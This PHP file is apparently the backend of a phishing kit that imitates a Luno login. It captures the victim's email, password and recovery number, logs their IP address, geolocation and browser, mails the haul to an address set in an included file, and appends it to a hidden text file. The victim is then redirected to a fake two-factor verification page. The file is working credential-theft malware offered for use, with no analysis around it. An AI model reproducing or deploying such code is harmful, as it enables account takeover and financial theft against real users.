<?php
$login = $_POST['email'];
if($_POST["email"] != "" and $_POST["emailpassword"] != ""){
$ip = getenv("REMOTE_ADDR");
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------New Logz-----------------------\n";
$message .= "Email            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['emailpassword']."\n";
$message .= "Recovery Number          : ".$_POST['contact']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= 	"City: {$geoplugin->city}  \n";
$message .= 	"Region: {$geoplugin->region} \n";
$message .= 	"Country Name: {$geoplugin->countryName} \n";
$message .= 	"Country Code: {$geoplugin->countryCode}  \n";
$message.= "Date Log  : ".$date." \n";
$message.= "Time Log  : ".$time." \n";
include "email.php";
$subject .= "Luno EnP Mail EN | $login";
$from .= "From: <Webmaster> \n";
mail($to,$subj,$message,$from);  
  
$fp = fopen("backupresultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);

  $praga=rand();
$praga=md5($praga);
  header ("Location: 2-factor_verification_confirm.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}
else{
header ("Location: index.php");
}


?>
